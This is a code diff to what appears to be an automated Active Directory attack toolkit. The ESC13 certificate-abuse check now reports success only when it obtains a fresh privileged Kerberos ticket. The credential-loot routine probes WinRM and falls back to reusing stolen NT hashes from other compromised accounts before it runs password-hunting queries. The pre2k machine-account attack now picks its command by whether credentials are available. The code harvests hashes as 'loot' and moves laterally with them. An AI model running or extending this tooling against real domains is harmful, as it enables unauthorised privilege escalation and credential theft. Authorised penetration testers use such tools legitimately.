@@ -4888,17 +4888,28 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
                     f"ESC13 selected: requesting current-user certificate from template {tpl} "
                     "without alternate UPN, then authenticating the PFX to refresh the ccache."
                 )
+                prev_ccache = SESSION.get("krb5_ccache")
                 auth_out = _certipy_req_auth(tpl, ca, "", username)
                 nt = re.search(r"[a-f0-9]{32}:([a-f0-9]{32})", auth_out)
-                exploited = bool(nt or SESSION.get("krb5_ccache"))
+                # ESC13's privilege lives in the Kerberos TGT's PAC (the OID-linked
+                # group SID), NOT in the NT hash — certipy/UnPAC just returns the
+                # user's own hash, which carries no added rights. So ESC13 counts
+                # as a usable shell ONLY when certipy auth wrote a FRESH privileged
+                # ccache this attempt. A pre-existing session ccache (initial
+                # request_tgt) or a bare NT hash must not flag shell-ready,
+                # otherwise we fire a doomed WinRM and report a false "TGT
+                # obtained". Target-agnostic: keys only off a newly-minted ccache.
+                fresh_ccache = (SESSION.get("krb5_ccache")
+                                if SESSION.get("krb5_ccache") != prev_ccache else None)
+                exploited = bool(fresh_ccache)
                 if nt:
                     SESSION.setdefault("loot", {})[username] = nt.group(1)
                     SESSION.setdefault("agent_intel", {}).setdefault("nt_hashes", {})[username] = nt.group(1)
                     SESSION["nt_hash"] = nt.group(1)
-                    add_finding("ADCS ESC13 - Group Membership via OID", "Critical",
-                                f"Template {tpl} maps cert to privileged group; TGT obtained",
-                                "Remove msDS-OIDToGroupLink on sensitive templates")
                 if exploited:
+                    add_finding("ADCS ESC13 - Group Membership via OID", "Critical",
+                                f"Template {tpl} maps cert to privileged group; privileged TGT obtained",
+                                "Remove msDS-OIDToGroupLink on sensitive templates")
                     SESSION.setdefault("agent_intel", {})["adcs_shell_ready"] = True
                     save_session()
                     results.append(
@@ -4907,7 +4918,19 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
                         f"against FQDN {dc_fqdn}, realm {domain.upper()}."
                     )
                 else:
-                    results.append(f"ESC13 template {tpl} found, but certificate auth did not yield a hash or ccache.")
+                    # Template is misconfigured (OID->group link) so it is still a
+                    # real finding, but auth did not yield a usable privileged ccache
+                    # in this run — report honestly and do NOT claim shell-ready.
+                    add_finding("ADCS ESC13 - Group Membership via OID", "High",
+                                f"Template {tpl} links a certificate to a privileged group via "
+                                f"msDS-OIDToGroupLink, but certificate auth did not produce a usable "
+                                f"privileged ccache in this run — verify manually with certipy auth.",
+                                "Remove msDS-OIDToGroupLink on sensitive templates")
+                    results.append(
+                        f"ESC13 template {tpl} found, but certificate auth did not produce a fresh "
+                        f"privileged ccache (an NT hash alone does not carry the ESC13 group SID). "
+                        f"Not flagging shell-ready."
+                    )
 
         if "ESC1" in scan_out:
             tpl, ca = _pick_template_ca_for_esc(scan_out, "1")
@@ -5993,6 +6016,44 @@ def tool_credential_loot(dc_ip: str, domain: str, username: str,
     nt_hash = _real_nt_hash(nt_hash)
     auth = _auth_args_nxc(username, password, nt_hash, domain, host)
     results = [f"=== Sensitive Data Hunt: {username}@{host} ==="]
+
+    # --- Pre-flight: confirm this principal can actually EXEC over WinRM before
+    # firing 9 loot queries. Accounts that authenticate but are not in Remote
+    # Management Users / not local admin cannot run -x, so every query would
+    # return an empty [-]. If the passed credential can't exec, fall back to any
+    # principal we already own WinRM exec on (populated for ANY engagement via
+    # owned_machines), preferring one tied to this host. Fully target-agnostic —
+    # nothing here is hardcoded to a specific box.
+    probe = _nxc(f"winrm {shell_quote(host)} {auth}", timeout=35)
+    if "Pwn3d" not in (probe or ""):
+        winrm_owned = [
+            m for m in SESSION.get("owned_machines", [])
+            if "winrm" in str(m.get("method", "")).lower()
+            and str(m.get("user", "")).strip()
+            and _real_nt_hash(m.get("nt_hash", ""))
+        ]
+        winrm_owned.sort(key=lambda m: 0 if str(m.get("machine", "")).strip() in
+                         (host, SESSION.get("dc_fqdn", ""), SESSION.get("dc_hostname", "")) else 1)
+        for m in winrm_owned:
+            fb_user = str(m["user"]).strip()
+            fb_hash = _real_nt_hash(m["nt_hash"])
+            if fb_user == username:
+                continue
+            cand_auth = _auth_args_nxc(fb_user, "", fb_hash, domain, host)
+            cand_probe = _nxc(f"winrm {shell_quote(host)} {cand_auth}", timeout=35)
+            if "Pwn3d" in (cand_probe or ""):
+                results.append(f"[*] {username} lacks WinRM exec on {host}; "
+                               f"switched to owned principal {fb_user}")
+                username, auth, probe = fb_user, cand_auth, cand_probe
+                break
+        if "Pwn3d" not in (probe or ""):
+            results.append(
+                f"[-] No WinRM exec rights on {host} for {username} (not in Remote "
+                f"Management Users / not local admin). Skipped loot queries — run "
+                f"discover_winrm_access or supply an owned principal (gMSA / service "
+                f"account) that can -x."
+            )
+            return "\n".join(results)[:6000]
 
     loot_commands = [
         # Config files with passwords
@@ -7804,8 +7865,14 @@ def tool_pre2k_attack(dc_ip: str, domain: str, username: str = "",
     if pre2k_bin or Path(pre2k_py).exists():
         bin_to_use = pre2k_bin or f"{sys.executable} {pre2k_py}"
         pw = _real_secret(password)
-        auth = f"-u {shell_quote(username)} -p {shell_quote(pw)} -d {shell_quote(domain)}" if pw else f"-d {shell_quote(domain)}"
-        cmd = f"timeout 60 {bin_to_use} unauth {auth} -dc-ip {shell_quote(dc_ip)} 2>&1"
+        # pre2k: 'auth' alt komutu -u/-p kabul eder, 'unauth' sadece -d alır
+        if pw and username:
+            subcmd = "auth"
+            auth = f"-u {shell_quote(username)} -p {shell_quote(pw)} -d {shell_quote(domain)}"
+        else:
+            subcmd = "unauth"
+            auth = f"-d {shell_quote(domain)}"
+        cmd = f"timeout 60 {bin_to_use} {subcmd} {auth} -dc-ip {shell_quote(dc_ip)} 2>&1"
         out = _run(cmd, timeout=65)
         results.append(f"=== Pre2K Scan ===\n{out[:2000]}")
         for m in re.finditer(r"VALID(?:\s+CREDENTIALS)?\s*:\s*(?:[A-Za-z0-9_.-]+\\)?([A-Za-z0-9_.-]+\$):([^\s]+)", out, re.I):
